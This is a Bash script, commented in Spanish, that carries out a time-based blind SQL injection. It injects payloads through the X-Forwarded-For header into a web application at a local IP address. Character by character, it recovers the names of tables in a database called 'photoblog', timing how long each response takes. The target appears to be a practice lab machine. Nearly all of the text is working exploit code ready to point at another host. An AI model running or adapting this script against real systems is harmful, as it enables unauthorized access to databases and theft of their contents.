#!/bin/bash
# Procedimiento:
# Recorre las posiciones del nombre de la tabla
# Para cada posición, itera sobre un conjunto de caracteres (a-z, A-Z, 0-9, y _)
# Construye un payload que utiliza SUBSTRING para verificar si el carácter en la posición actual coincide con el del nombre de la tabla
# Si el carácter es correcto, la respuesta se retrasa  1 seg. o sleep(0.043)
# _..::ACTUALIZACI0N::.._
# La variable position se reinicia en cada iteración de tabla para evitar errores de posiciones previas.
#  El script ahora verifica si tb_name está vacío después de un intento de descubrir una tabla. Si está vacío, significa que no hay más tablas, y el script termina.

url="http://192.168.44.134"
expected_delay=1.0                # Retraso esperado equivalente a 1 segundo (sleep(0.043))
db_name="photoblog"               # Base de datos a investigar
tb_count=4
characters="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_"

echo -e "\nIniciando búsqueda de los nombres de las tablas en la base de datos '$db_name'...\n"

# Iterar sobre el número de tablas encontradas
for ((tb_index=0; tb_index < tb_count; tb_index++)); do
    tb_name=""  # Reinicia el nombre para cada búsqueda
    position=1
    echo -e "\n[*] Descubriendo el nombre de la tabla $((tb_index + 1)) en la BD $db_name"

    # Iteración en cada letra en el nombre de la tabla
    while true; do
        found_char=false

        # Itera sobre cada carácter posible para encontrar el correcto
        for char in $(echo $characters | fold -w1); do
            # Payload que verifica si el carácter en la posición actual coincide
            payload="1' OR IF((SELECT SUBSTRING(table_name,$position,1) FROM information_schema.tables WHERE table_schema='$db_name' LIMIT $tb_index,1)='$char', SLEEP(0.043), 0) #"

            # Envía la solicitud con el encabezado X-Forwarded-For para inyectar el payload
            start=$(date +%s.%N)
            response=$(curl -s -w "%{time_total}" -o /dev/null -H "X-Forwarded-For: $payload" "$url")
            end=$(date +%s.%N)

            # Calcula el tiempo de respuesta
            duration=$(echo "$end - $start" | bc)

            # Comparación de tiempo de respuesta
            if (( $(echo "$duration > $expected_delay" | bc -l) )); then
                tb_name+=$char
                echo -ne "\r[+] Nombre de la tabla encontrado hasta ahora: $tb_name"
                found_char=true
                break
            fi
        done

        # Si no se encontró un carácter en esta posición, el nombre de la tabla está completo
        if [ "$found_char" = false ]; then
            if [ -z "$tb_name" ]; then
                echo -e "\n[!] No se encontraron más tablas. Terminando la búsqueda.\n"
                exit 0
            else
                echo -e "\n[!] Nombre completo de la tabla encontrado: $tb_name\n"
                break
            fi
        fi

        # Incrementa la posición para la siguiente letra
        position=$((position + 1))
    done
done
